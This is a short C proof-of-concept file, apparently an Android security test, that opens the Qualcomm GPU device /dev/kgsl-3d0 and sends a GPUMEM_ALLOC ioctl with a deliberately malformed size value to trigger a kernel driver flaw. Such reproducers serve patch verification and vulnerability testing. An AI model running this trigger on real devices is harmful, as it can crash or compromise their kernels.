/**
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>

#define IOCTL_KGSL_GPUMEM_ALLOC 0xc018092ful
int main() {
  int fd = open("/dev/kgsl-3d0", 0);
  mmap((void *)0x20000000ul, 0xd000ul, PROT_READ | PROT_WRITE,
       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

  *(uint64_t *)0x20000ff0 = (uint64_t)0xfffffffffffff416;
  *(uint32_t *)0x20000ff8 = (uint32_t)0x80;
  *(uint32_t *)0x20000ffc = (uint32_t)0x8000;
  *(uint32_t *)0x20001000 = (uint32_t)0x12345678;
  ioctl(fd, 0xc018092ful, 0x20000ff0ul);
  close(fd);
  return 0;
}
